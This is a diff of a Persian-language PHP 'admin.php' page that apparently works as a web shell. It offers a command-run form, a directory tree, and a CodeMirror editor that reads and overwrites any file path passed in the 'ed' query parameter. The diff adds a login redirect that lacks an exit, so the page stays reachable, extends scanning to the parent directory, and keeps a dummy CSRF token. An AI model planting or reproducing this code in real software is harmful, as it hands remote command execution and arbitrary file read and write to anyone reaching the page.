@@ -1,3 +1,13 @@
+<?php
+
+// admin.php
+session_start();
+
+if (!isset($_SESSION['username']) || !isset($_SESSION['password'])) {
+    header("location:log/index.php");
+}
+
+?>
 <!DOCTYPE html>
 <html lang="fa-IR" dir="rtl" >
 <head>
@@ -29,13 +39,13 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/addon/edit/closetag.min.js" integrity="sha512-XYx5xhl4B5vKNlaRBWh/nlti0+IPM6eT+dSFc3/oc4rERn2DpwbS3q4OblprqqBLXyRSVePKmf+8mHkDLtGZpg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/addon/search/search.min.js" integrity="sha512-Mw3RqCUHTyvN3iSp5TSs731TiLqnKrxzyy2UVZv3+tJa524Rj7pBC7Ivv3ka2oDnkQwLOMHNDKU5nMJ16YRgrA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/addon/search/searchcursor.min.js" integrity="sha512-+ZfZDC9gi1y9Xoxi9UUsSp+5k+AcFE0TRNjI0pfaAHQ7VZTaaoEpBZp9q9OvHdSomOze/7s5w27rcsYpT6xU6g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/display/fullscreen.min.css">
-<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/display/fullscreen.min.js"></script><link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazir-font@v30.1.0/dist/font-face.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/display/fullscreen.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/display/fullscreen.min.js"></script><link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazir-font@v30.1.0/dist/font-face.css" rel="stylesheet">
     <style>
         .CodeMirror {
             border: 1px solid #eee;
             height: auto;
-			 font-family: 'Vazir', 'Tahoma', sans-serif;
+            font-family: 'Vazir', 'Tahoma', sans-serif;
         }
         .back-to-top {
             position: fixed;
@@ -81,51 +91,122 @@
         }
     </style>
     <style>
-    #codeEditor, #lineCounter {
-    font-family: lucida console, courier new, courier, monospace;
-    margin: 0;
-    padding: 10px 0;
-    height: 40vh;
-    border-radius: 0;
-    resize: none;
-    font-size: 16px;
-    line-height: 1.2;
-    outline: none;
-    -moz-box-sizing: border-box;
-    -webkit-box-sizing: border-box;
-    box-sizing: border-box;
-    }
-    #codeEditor {
-    padding-left: calc(3.5rem + 5px);
-    width:100%;
-    /* Determine appearance of code editor */
-    background-color:#272822;
-    border-color:#272822;
-    color:#ffffff;
-    }
-    #lineCounter {
-    display: flex;
-    border-color: transparent;
-    overflow-y: hidden;
-    text-align: right;
-    box-shadow: none;
-    color: #707070;
-    background-color: #d8d8d8;
-    position: absolute;
-    width: 3.5rem;
-    /* Determine appearance of line counter */
-    background-color:#3E3D32;
-    border-color:#3E3D32;
-    color:#928869;
-    }
-    #lineCounter:focus-visible,
-    #codeEditor:focus-visible {
-    outline:none;
-    }
+        #codeEditor, #lineCounter {
+            font-family: lucida console, courier new, courier, monospace;
+            margin: 0;
+            padding: 10px 0;
+            height: 40vh;
+            border-radius: 0;
+            resize: none;
+            font-size: 16px;
+            line-height: 1.2;
+            outline: none;
+            -moz-box-sizing: border-box;
+            -webkit-box-sizing: border-box;
+            box-sizing: border-box;
+        }
+        #codeEditor {
+            padding-left: calc(3.5rem + 5px);
+            width:100%;
+            /* Determine appearance of code editor */
+            background-color:#272822;
+            border-color:#272822;
+            color:#ffffff;
+        }
+        #lineCounter {
+            display: flex;
+            border-color: transparent;
+            overflow-y: hidden;
+            text-align: right;
+            box-shadow: none;
+            color: #707070;
+            background-color: #d8d8d8;
+            position: absolute;
+            width: 3.5rem;
+            /* Determine appearance of line counter */
+            background-color:#3E3D32;
+            border-color:#3E3D32;
+            color:#928869;
+        }
+        #lineCounter:focus-visible,
+        #codeEditor:focus-visible {
+            outline:none;
+        }
+        ul.mytree-ul {
+            list-style: none;
+            margin-left: 20px;
+            padding-left: 15px;
+            border-left: 1px dotted #aaa;
+        }
+
+        ul.mytree-ul li {
+            margin: 4px 0;
+            position: relative;
+        }
+
+        ul.mytree-ul li .mytree-toggle {
+            cursor: pointer;
+            font-size: 18px;
+            margin-right: 5px;
+            font-weight: bold;
+            user-select: none;
+            color: #0d6efd;
+        }
+
+        ul.mytree-ul li .mytree-folder {
+            font-weight: bold;
+            color: #157347;
+            cursor: default;
+        }
+
+        ul.mytree-ul li a {
+            text-decoration: none;
+            color: #333;
+        }
+
+        ul.mytree-ul li a.mytree-active {
+            font-weight: bold;
+            color: #d9534f;
+        }
+
+        .mytree-hidden {
+            display: none;
+        }
+
+
     </style>
-	<link rel="icon" type="image/svg+xml"
-      href="data:image/svg+xml,%3Csvg id='Layer_1' data-name='Layer 1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' viewBox='0 0 2160 2160'%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill:url(%23linear-gradient);%7D.cls-2%7Bfill:url(%23linear-gradient-2);%7D.cls-3%7Bfill:url(%23linear-gradient-3);%7D.cls-4%7Bfill:url(%23linear-gradient-4);%7D.cls-5%7Bfont-size:190px;fill:%2300298e;font-family:Calibri;%7D.cls-6%7Bletter-spacing:0em;%7D.cls-7%7Bletter-spacing:-0.01em;%7D%3C/style%3E%3ClinearGradient id='linear-gradient' x1='472.85' y1='957.44' x2='654.88' y2='957.44' gradientUnits='userSpaceOnUse'%3E%3Cstop offset='0' stop-color='%230061ff'/%3E%3Cstop offset='1' stop-color='%231b141a'/%3E%3C/linearGradient%3E%3ClinearGradient id='linear-gradient-2' x1='373' y1='861.82' x2='1056.19' y2='861.82' xlink:href='%23linear-gradient'/%3E%3ClinearGradient id='linear-gradient-3' x1='677.16' y1='1181.33' x2='882.61' y2='1181.33' xlink:href='%23linear-gradient'/%3E%3ClinearGradient id='linear-gradient-4' x1='695.59' y1='1038.28' x2='1754.36' y2='1038.28' xlink:href='%23linear-gradient'/%3E%3C/defs%3E%3Ctitle%3EArtboard ۲%3C/title%3E%3Cpolygon class='cls-1' points='654.88 974.53 654.88 930.75 543.51 1005.64 490.52 952.64 472.85 869.31 472.85 978.76 533.53 1045.58 654.88 974.53'/%3E%3Cpolygon class='cls-2' points='677.54 979.91 677.54 571.3 706.73 649.64 762.03 551.33 774.32 606.63 841.39 560.29 828.08 595.88 940.98 570.02 1056.19 651.69 987.84 906.94 509.72 1172.31 373 1012.17 451.73 839.74 451.73 1006.02 511.06 1065.35 677.54 979.91'/%3E%3Cpolygon class='cls-3' points='825.01 1175.38 827.31 1221.46 791.21 1240.66 775.08 1206.1 806.96 1023.3 681.38 1098.57 677.16 1214.17 738.98 1339.36 882.61 1275.23 875.7 1160.4 825.01 1175.38'/%3E%3Cpath class='cls-4' d='M1605.35,1375.07l-9.21-185.48-65.67-124.43,128.26,68.36-242.7-298L1070.78,670,999.36,916.16l-132.88,81,50.69,121,131.34,157.45-7.68,99.46-30.72-2.68,8.45-107.15L913,1146.58V1304l-46.85,76-170.51,26.49,1058.77-4.22Zm-151.3-3.45-74.51,2.3,2.31-57.22,19.58-47.23-126-10.37v41.09l-43.78,78-53.76-1.92-6.53-117.13-23.81-72.58,38-88.72-13.82,77.58,21.88,62.6,233.11,18.81,43.78,61.06Z'/%3E%3Ctext class='cls-5' transform='translate(664.9 1549.29)'%3EPhpd%3Ctspan class='cls-6' x='397.63' y='0'%3Ee%3C/tspan%3E%3Ctspan class='cls-7' x='491.24' y='0'%3Ev%3C/tspan%3E%3Ctspan x='575.2' y='0'%3Eelop.er%3C/tspan%3E%3C/text%3E%3C/svg%3E" />
-   <!-- <link rel="icon" href="https://manbaenab.ir/favicon.ico">--!>
+    <link rel="icon" type="image/svg+xml"
+          href="data:image/svg+xml,%3Csvg id='Layer_1' data-name='Layer 1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' viewBox='0 0 2160 2160'%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill:url(%23linear-gradient);%7D.cls-2%7Bfill:url(%23linear-gradient-2);%7D.cls-3%7Bfill:url(%23linear-gradient-3);%7D.cls-4%7Bfill:url(%23linear-gradient-4);%7D.cls-5%7Bfont-size:190px;fill:%2300298e;font-family:Calibri;%7D.cls-6%7Bletter-spacing:0em;%7D.cls-7%7Bletter-spacing:-0.01em;%7D%3C/style%3E%3ClinearGradient id='linear-gradient' x1='472.85' y1='957.44' x2='654.88' y2='957.44' gradientUnits='userSpaceOnUse'%3E%3Cstop offset='0' stop-color='%230061ff'/%3E%3Cstop offset='1' stop-color='%231b141a'/%3E%3C/linearGradient%3E%3ClinearGradient id='linear-gradient-2' x1='373' y1='861.82' x2='1056.19' y2='861.82' xlink:href='%23linear-gradient'/%3E%3ClinearGradient id='linear-gradient-3' x1='677.16' y1='1181.33' x2='882.61' y2='1181.33' xlink:href='%23linear-gradient'/%3E%3ClinearGradient id='linear-gradient-4' x1='695.59' y1='1038.28' x2='1754.36' y2='1038.28' xlink:href='%23linear-gradient'/%3E%3C/defs%3E%3Ctitle%3EArtboard ۲%3C/title%3E%3Cpolygon class='cls-1' points='654.88 974.53 654.88 930.75 543.51 1005.64 490.52 952.64 472.85 869.31 472.85 978.76 533.53 1045.58 654.88 974.53'/%3E%3Cpolygon class='cls-2' points='677.54 979.91 677.54 571.3 706.73 649.64 762.03 551.33 774.32 606.63 841.39 560.29 828.08 595.88 940.98 570.02 1056.19 651.69 987.84 906.94 509.72 1172.31 373 1012.17 451.73 839.74 451.73 1006.02 511.06 1065.35 677.54 979.91'/%3E%3Cpolygon class='cls-3' points='825.01 1175.38 827.31 1221.46 791.21 1240.66 775.08 1206.1 806.96 1023.3 681.38 1098.57 677.16 1214.17 738.98 1339.36 882.61 1275.23 875.7 1160.4 825.01 1175.38'/%3E%3Cpath class='cls-4' d='M1605.35,1375.07l-9.21-185.48-65.67-124.43,128.26,68.36-242.7-298L1070.78,670,999.36,916.16l-132.88,81,50.69,121,131.34,157.45-7.68,99.46-30.72-2.68,8.45-107.15L913,1146.58V1304l-46.85,76-170.51,26.49,1058.77-4.22Zm-151.3-3.45-74.51,2.3,2.31-57.22,19.58-47.23-126-10.37v41.09l-43.78,78-53.76-1.92-6.53-117.13-23.81-72.58,38-88.72-13.82,77.58,21.88,62.6,233.11,18.81,43.78,61.06Z'/%3E%3Ctext class='cls-5' transform='translate(664.9 1549.29)'%3EPhpd%3Ctspan class='cls-6' x='397.63' y='0'%3Ee%3C/tspan%3E%3Ctspan class='cls-7' x='491.24' y='0'%3Ev%3C/tspan%3E%3Ctspan x='575.2' y='0'%3Eelop.er%3C/tspan%3E%3C/text%3E%3C/svg%3E" />
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            document.body.addEventListener("click", function (e) {
+                if (e.target.classList.contains("mytree-toggle")) {
+                    const nextUl = e.target.parentElement.querySelector("ul.mytree-ul");
+                    if (nextUl) {
+                        if (nextUl.classList.contains("mytree-hidden")) {
+                            nextUl.classList.remove("mytree-hidden");
+                            e.target.textContent = "-";
+                        } else {
+                            nextUl.classList.add("mytree-hidden");
+                            e.target.textContent = "+";
+                        }
+                    }
+                }
+            });
+
+            // مسیر فایل انتخاب‌شده باز بماند
+            document.querySelectorAll("a.mytree-active").forEach(function (activeLink) {
+                let parent = activeLink.closest("ul.mytree-ul");
+                while (parent && parent.previousElementSibling && parent.previousElementSibling.classList.contains("mytree-toggle")) {
+                    parent.classList.remove("mytree-hidden");
+                    parent.previousElementSibling.textContent = "-";
+                    parent = parent.parentElement.closest("ul.mytree-ul");
+                }
+            });
+        });
+    </script>
+
+
 </head>
 
 <body style="background-color:#000000 !important;">
@@ -136,12 +217,12 @@
             open cmd
         </a>
         <div id="cmddiv" style="<?php if (empty($_POST['cmd'])){echo 'display:none';}else{echo 'display:block';} ?>">
-		<?php
-			if (!function_exists('csrf_token')){
+            <?php
+            if (!function_exists('csrf_token')){
                 function csrf_token(){return 0 ;} ;
             }?>
-			<form class="container sa-ltr"  method="post">
-<input type="hidden" name="_token" value="<?=csrf_token()?>" />
+            <form class="container sa-ltr"  method="post">
+                <input type="hidden" name="_token" value="<?=csrf_token()?>" />
                 <input type="text" class="form-control bg-dark text-primary" name="cmd" id="cmd">
                 <input class="btn btn-primary" type="submit" name="submit2" value="RUN 2>&1">
                 <button type="submit" name="submit" class="btn btn-primary" style="background-color : purple;border-color: purple">RUN </button>
@@ -209,64 +290,97 @@
             line_counter();
             codeEditor.scrollTop=codeEditor.scrollHeight;
         </script>
-</div>
+    </div>
+
     <div class="container sa-ltr ">
         <br>
         <br>
+
         <?php
-        $chek_dir[1]    =   __DIR__ . '/';
-        //  $chek_dir[2]  =   __DIR__ . '/../../app/Http/Controllers';
-        //  $chek_dir[3]  =   __DIR__ . '/../../public/';
-        $clearname = $chek_dir; // or part of path like  'C:\laragon\www'
-        function getDirContents($dir, &$results = array())
-        {
-            $files = scandir($dir);
-            foreach ($files as $key => $value) {
-                $path = realpath($dir . DIRECTORY_SEPARATOR . $value);
-                if (!is_dir($path)) {
-                    $results[] = $path;
-                } else if ($value != "." && $value != "..") {
-                    getDirContents($path, $results);
-                    //   $results[] = $path;
-                }
-            }
-            return $results;
-        }
+        $chek_dir[1] = __DIR__ . '/';
+        $chek_dir[1] = __DIR__ . '/../';
+        $selectedFile = $_GET['ed'] ?? null;
+
         if (isset($_POST['codesubmit'])) {
-            $file_contents = str_replace("\nH", ",H", $_POST['content']);
             file_put_contents($_GET['ed'], $_POST['content']);
             ?>
             <div class="alert sa-rtl">
-                <span class="closebtn " onclick="this.parentElement.style.display='none';">&times;</span>
-                <strong> ذخیره شد ! </strong> <strong>تغیرات با موفقیت انجام شد</strong>
+                <span class="closebtn" onclick="this.parentElement.style.display='none';">&times;</span>
+                <strong> ذخیره شد ! </strong> <strong>تغییرات با موفقیت انجام شد</strong>
             </div>
-        <?php  }
-        $url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
-        $url = substr($url, 0, strpos($url, "?"));
-        $akk =[] ;
-        foreach($chek_dir as $one_dir){
-            $akk = array_merge($akk, getDirContents($one_dir));
+        <?php }
+
+        $url = strtok($_SERVER["REQUEST_URI"], "?");
+
+        function renderTreeCustom($dir, $baseUrl, $selectedFile)
+        {
+            $items = scandir($dir);
+            $dirs = [];
+            $files = [];
+
+            foreach ($items as $item) {
+                if ($item === '.' || $item === '..') continue;
+                $path = realpath($dir . DIRECTORY_SEPARATOR . $item);
+                if (is_dir($path)) {
+                    $dirs[] = $item;
+                } else {
+                    $files[] = $item;
+                }
+            }
+
+            natcasesort($dirs);
+            natcasesort($files);
+
+            echo '<ul class="mytree-ul">';
+            foreach ($dirs as $d) {
+                $path = realpath($dir . DIRECTORY_SEPARATOR . $d);
+                $isSelected = ($selectedFile && strpos($selectedFile, $path) === 0);
+
+                echo '<li>';
+                echo '<span class="mytree-toggle">+</span> <span class="mytree-folder">' . htmlspecialchars($d) . '</span>';
+
+                // همیشه زیرشاخه‌ها رو تولید کن، فقط اگه انتخاب نشده بودن مخفی کن
+                echo '<ul class="mytree-ul' . ($isSelected ? '' : ' mytree-hidden') . '">';
+                renderTreeCustom($path, $baseUrl, $selectedFile);
+                echo '</ul>';
+
+                echo '</li>';
+            }
+
+
+            foreach ($files as $f) {
+                $path = realpath($dir . DIRECTORY_SEPARATOR . $f);
+                $link = $baseUrl . '?ed=' . urlencode($path);
+                $active = ($selectedFile === $path) ? ' class="mytree-active"' : '';
+                echo '<li><a href="' . $link . '"' . $active . '>' . htmlspecialchars($f) . '</a></li>';
+            }
+            echo '</ul>';
         }
 
-        foreach ($akk as $file) {
-            echo '<a href="' . $url . '?ed=' . $file . '"  >' . str_replace($clearname, '', $file) . '</a><br>';
+        foreach ($chek_dir as $one_dir) {
+            renderTreeCustom($one_dir, $url, $selectedFile);
         }
+
         if (!empty($_GET['ed'])) {
             $path_to_file = $_GET['ed'];
             $file_contents = file_get_contents($path_to_file);
-            echo '<h4 class="sa-lime sa-ltr">' . $_GET['ed'] . '+++  شما در حال تغیر فایل زیر هستید  +++' . '</h4>';
+            echo '<h4 class="sa-lime sa-ltr">' . $_GET['ed'] . ' +++ شما در حال تغییر فایل زیر هستید +++</h4>';
         } else {
             $file_contents = '';
         }
         ?>
-        <script>
-		
-		$(document).ready(function() {
-    var codeEditorElement = $(".codemirror-textarea")[0];
 
-    // تنظیم فونت فارسی (Vazir)
-    var style = document.createElement('style');
-    style.innerHTML = `
+
+
+
+        <script>
+
+            $(document).ready(function() {
+                var codeEditorElement = $(".codemirror-textarea")[0];
+
+                // تنظیم فونت فارسی (Vazir)
+                var style = document.createElement('style');
+                style.innerHTML = `
         .CodeMirror {
             font-family: 'Vazir', 'Tahoma', sans-serif;
             font-size: 14px;
@@ -277,70 +391,70 @@
             unicode-bidi: embed;
         }
     `;
-    document.head.appendChild(style);
+                document.head.appendChild(style);
 
-    var editor = CodeMirror.fromTextArea(codeEditorElement, {
-        mode: "application/x-httpd-php",
-        extraKeys: {
-            "Ctrl-Space": "autocomplete",
-            "F11": function(cm) {
-                cm.setOption("fullScreen", !cm.getOption("fullScreen"));
-            },
-            "Esc": function(cm) {
-                if (cm.getOption("fullScreen")) cm.setOption("fullScreen", false);
-            }
-        },
-        autoCloseBrackets: true,
-        autoCloseTags: true,
-        showCursorWhenSelecting: true,
-        tabSize: 2,
-        direction: 'ltr',
-        keyMap: "sublime",
-        lineWrapping: true,
-        lineNumbers: true,
-        matchBrackets: true,
-        theme: "monokai",
-        lineWiseCopyCut: true,
-        undoDepth: 200,
-    });
+                var editor = CodeMirror.fromTextArea(codeEditorElement, {
+                    mode: "application/x-httpd-php",
+                    extraKeys: {
+                        "Ctrl-Space": "autocomplete",
+                        "F11": function(cm) {
+                            cm.setOption("fullScreen", !cm.getOption("fullScreen"));
+                        },
+                        "Esc": function(cm) {
+                            if (cm.getOption("fullScreen")) cm.setOption("fullScreen", false);
+                        }
+                    },
+                    autoCloseBrackets: true,
+                    autoCloseTags: true,
+                    showCursorWhenSelecting: true,
+                    tabSize: 2,
+                    direction: 'ltr',
+                    keyMap: "sublime",
+                    lineWrapping: true,
+                    lineNumbers: true,
+                    matchBrackets: true,
+                    theme: "monokai",
+                    lineWiseCopyCut: true,
+                    undoDepth: 200,
+                });
 
-    editor.setOption("font-family", "Vazir, Tahoma, sans-serif");
+                editor.setOption("font-family", "Vazir, Tahoma, sans-serif");
 
-    var complexArray = <?php echo json_encode($file_contents); ?>;
-    editor.setValue(complexArray);
+                var complexArray = <?php echo json_encode($file_contents); ?>;
+                editor.setValue(complexArray);
 
-    // تابع برای تشخیص کلمات فارسی و اعمال استایل
-    function applyRTLStyles(cm) {
-        var content = cm.getValue();
-        var regex = /[\u0600-\u06FF\uFB8A\u067E\u0686\u06AF\u200C]+/g; // تشخیص کلمات فارسی
-        var decorations = [];
+                // تابع برای تشخیص کلمات فارسی و اعمال استایل
+                function applyRTLStyles(cm) {
+                    var content = cm.getValue();
+                    var regex = /[\u0600-\u06FF\uFB8A\u067E\u0686\u06AF\u200C]+/g; // تشخیص کلمات فارسی
+                    var decorations = [];
 
-        var match;
-        while ((match = regex.exec(content)) !== null) {
-            var from = cm.posFromIndex(match.index);
-            var to = cm.posFromIndex(match.index + match[0].length);
-            decorations.push({
-                from: from,
-                to: to,
-                options: { className: 'rtl-text' }
+                    var match;
+                    while ((match = regex.exec(content)) !== null) {
+                        var from = cm.posFromIndex(match.index);
+                        var to = cm.posFromIndex(match.index + match[0].length);
+                        decorations.push({
+                            from: from,
+                            to: to,
+                            options: { className: 'rtl-text' }
+                        });
+                    }
+
+                    cm.getAllMarks().forEach(mark => mark.clear());
+                    decorations.forEach(decoration => {
+                        cm.markText(decoration.from, decoration.to, {
+                            className: decoration.options.className
+                        });
+                    });
+                }
+
+                editor.on("change", function(cm) {
+                    applyRTLStyles(cm);
+                });
+
+                applyRTLStyles(editor);
             });
-        }
 
-        cm.getAllMarks().forEach(mark => mark.clear()); 
-        decorations.forEach(decoration => {
-            cm.markText(decoration.from, decoration.to, {
-                className: decoration.options.className
-            });
-        });
-    }
-
-    editor.on("change", function(cm) {
-        applyRTLStyles(cm);
-    });
-
-    applyRTLStyles(editor);
-});
-			
 
             $(document).ready(function() {
                 $(window).scroll(function() {
@@ -357,7 +471,7 @@
                     return false;
                 });
             });
-			
+
         </script>
         <div class="col-lg-12" >
             <br>
